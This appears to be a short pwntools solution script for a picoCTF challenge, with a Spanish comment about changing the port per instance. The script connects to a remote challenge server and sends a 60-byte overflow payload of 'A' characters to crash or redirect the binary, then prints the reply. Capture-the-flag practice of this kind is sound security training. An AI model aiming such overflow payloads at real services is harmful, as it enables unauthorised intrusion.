from pwn import *

host = "saturn.picoctf.net"
port = 63304 #Cambiar puerto por nueva instancia

binary = remote(host, port)

payload = b"A"*60

binary.recvuntil(b"Input:")
binary.sendline(payload)

response = binary.recvall(timeout=5)
print(f"{response.decode('utf-8')}")
